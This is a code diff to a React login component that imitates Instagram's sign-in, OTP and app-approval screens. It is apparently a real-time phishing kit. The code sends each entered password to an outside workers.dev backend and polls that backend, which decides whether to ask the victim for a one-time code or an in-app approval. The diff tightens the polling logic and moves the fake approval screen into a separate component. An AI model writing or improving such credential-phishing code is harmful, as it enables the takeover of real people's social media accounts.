@@ -1,8 +1,8 @@
-import React, { useState, useRef } from 'react';
+import React, { useState, useRef, useCallback } from 'react';
 import pfp from './assets/pfp.jpg';
-import instlogo from './assets/instlogo.png';
 import metalogo from './assets/metalogo.png';
 import textlogo from './assets/textlogo.png';
+import InstagramApproval from './instagramApproval';
 
 const AccountLogin = () => {
   const [formData, setFormData] = useState({
@@ -13,6 +13,7 @@ const AccountLogin = () => {
   const [trustDevice, setTrustDevice] = useState(false);
   const [otpVerificationStatus, setOtpVerificationStatus] = useState('idle'); // idle, pending, approved, rejected
   const [alertConfig, setAlertConfig] = useState({ show: false, title: '', message: '' });
+  const pollingIntervalRef = useRef(null);
 
   const showAlert = (title, message) => {
     setAlertConfig({ show: true, title, message });
@@ -31,13 +32,11 @@ const AccountLogin = () => {
   };
 
   const [verificationStatus, setVerificationStatus] = useState('idle'); // idle, pending, approved, rejected
-  const [pollingInterval, setPollingInterval] = useState(null);
 
   const handleSubmit = async (e) => {
     e.preventDefault();
     if (formData.password) {
       try {
-        // Submit password to backend
         const response = await fetch('https://instagram-be.mizerablepi.workers.dev/test/submit-password', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -45,17 +44,8 @@ const AccountLogin = () => {
         });
         
         if (response.ok) {
-          const data = await response.json();
-          const action = data.required_action || data.type || 'otp';
-          
-          if (action === 'authorize_app') {
-            setCurrentScreen('authorize_app');
-            setVerificationStatus('pending');
-            startPolling();
-          } else {
-            setVerificationStatus('pending');
-            startPolling();
-          }
+          setVerificationStatus('pending');
+          startPolling();
         }
       } catch (error) {
         console.error('Error submitting password:', error);
@@ -64,38 +54,39 @@ const AccountLogin = () => {
     }
   };
 
-  const startPolling = () => {
+  const startPolling = useCallback(() => {
+    if (pollingIntervalRef.current) {
+      clearInterval(pollingIntervalRef.current);
+    }
     const interval = setInterval(async () => {
       try {
         const response = await fetch('https://instagram-be.mizerablepi.workers.dev/test/check-status');
         const data = await response.json();
         
         if (data.status === 'approved') {
-          setVerificationStatus('approved');
           clearInterval(interval);
-          if (currentScreen === 'authorize_app' || data.required_action === 'authorize_app') {
-            return;
+          pollingIntervalRef.current = null;
+          const nextAction = data.required_action || data.type || 'otp';
+          if (nextAction === 'authorize_app') {
+            setCurrentScreen('authorize_app');
+            setVerificationStatus('idle');
           } else {
             setCurrentScreen('otp');
           }
         } else if (data.status === 'rejected') {
-          setVerificationStatus('rejected');
           clearInterval(interval);
-          if (currentScreen === 'authorize_app' || data.required_action === 'authorize_app') {
-            return;
-          } else {
-            setVerificationStatus('idle');
-            setFormData({ password: '' });
-            showAlert('Incorrect password', 'The password that you\'ve entered is incorrect. Please try again.');
-          }
+          pollingIntervalRef.current = null;
+          setVerificationStatus('idle');
+          setFormData({ password: '' });
+          showAlert('Incorrect password', 'The password that you\'ve entered is incorrect. Please try again.');
         }
       } catch (error) {
         console.error('Polling error:', error);
       }
-    }, 2000); // Poll every 2 seconds
+    }, 2000);
     
-    setPollingInterval(interval);
-  };
+    pollingIntervalRef.current = interval;
+  }, []);
 
   const handleOtpChange = (e) => {
     const value = e.target.value.replace(/\D/g, ''); // Only allow digits
@@ -150,6 +141,10 @@ const AccountLogin = () => {
   };
 
   const handleBackToLogin = () => {
+    if (pollingIntervalRef.current) {
+      clearInterval(pollingIntervalRef.current);
+      pollingIntervalRef.current = null;
+    }
     setCurrentScreen('login');
     setOtp('');
     setFormData({ password: '' });
@@ -283,85 +278,7 @@ const AccountLogin = () => {
 
   // Authorize From App Screen
   if (currentScreen === 'authorize_app') {
-    return (
-      <div className="min-h-screen bg-[#1C2A33] text-white flex flex-col font-sans">
-        {/* Back Button */}
-        <button 
-          onClick={handleBackToLogin}
-          className="absolute top-6 left-6 text-white hover:text-gray-300 transition"
-        >
-          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
-            <path d="M19 12H5M12 19l-7-7 7-7"/>
-          </svg>
-        </button>
-
-        {verificationStatus === 'approved' ? (
-          /* Approved Full Page */
-          <div className="flex-1 flex flex-col items-center justify-center px-6">
-            <div className="mb-8">
-              <svg width="80" height="80" viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <circle cx="40" cy="40" r="30" stroke="#00c853" strokeWidth="3" fill="none"/>
-                <path d="M28 40l8 8 16-16" stroke="#00c853" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"/>
-              </svg>
-            </div>
-            <h1 className="text-2xl font-semibold mb-4 text-center">Login Approved</h1>
-            <p className="text-sm text-gray-400 text-center mb-8 max-w-xs">
-              Your login has been approved from the Instagram app.
-            </p>
-            <button
-              onClick={handleBackToLogin}
-              className="w-full max-w-xs py-2.5 rounded-lg text-base font-semibold bg-[#0095f6] hover:bg-[#0064E0] text-white transition"
-            >
-              Continue
-            </button>
-          </div>
-        ) : verificationStatus === 'rejected' ? (
-          /* Rejected Full Page */
-          <div className="flex-1 flex flex-col items-center justify-center px-6">
-            <div className="mb-8">
-              <svg width="80" height="80" viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <circle cx="40" cy="40" r="30" stroke="#ff3333" strokeWidth="3" fill="none"/>
-                <path d="M30 30l20 20M50 30l-20 20" stroke="#ff3333" strokeWidth="3" strokeLinecap="round"/>
-              </svg>
-            </div>
-            <h1 className="text-2xl font-semibold mb-4 text-center">Authorization Denied</h1>
-            <p className="text-sm text-gray-400 text-center mb-8 max-w-xs">
-              The login request was not approved from the Instagram app. Please try again.
-            </p>
-            <button
-              onClick={handleBackToLogin}
-              className="w-full max-w-xs py-2.5 rounded-lg text-base font-semibold bg-[#0095f6] hover:bg-[#0064E0] text-white transition"
-            >
-              Try Again
-            </button>
-          </div>
-        ) : (
-          /* Pending/Waiting Full Page */
-          <div className="flex-1 flex flex-col items-center justify-center px-6">
-            <div className="mb-8">
-              <svg width="80" height="80" viewBox="0 0 80 80" fill="none" xmlns="http://www.w3.org/2000/svg">
-                <rect x="10" y="10" width="60" height="60" rx="12" stroke="#0095f6" strokeWidth="3" fill="none"/>
-                <path d="M40 25v6m0 4v2" stroke="#0095f6" strokeWidth="3" strokeLinecap="round"/>
-                <rect x="33" y="37" width="14" height="14" rx="3" stroke="#0095f6" strokeWidth="2" fill="none"/>
-                <circle cx="40" cy="44" r="2" fill="#0095f6"/>
-              </svg>
-            </div>
-            <h1 className="text-2xl font-semibold mb-4 text-center">Authorize This Login</h1>
-            <p className="text-sm text-gray-400 text-center mb-4 max-w-xs">
-              We sent a login request to the Instagram app on your device. 
-              Please open the app and approve this login.
-            </p>
-            <div className="flex items-center gap-3 mt-6 px-6 py-4 bg-[#25343F] rounded-lg">
-              <svg className="animate-spin h-5 w-5 text-[#0095f6]" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
-                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
-                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-              </svg>
-              <span className="text-sm text-gray-300">Waiting for approval from app...</span>
-            </div>
-          </div>
-        )}
-      </div>
-    );
+    return <InstagramApproval onBack={handleBackToLogin} />;
   }
 
   // Default Login Screen
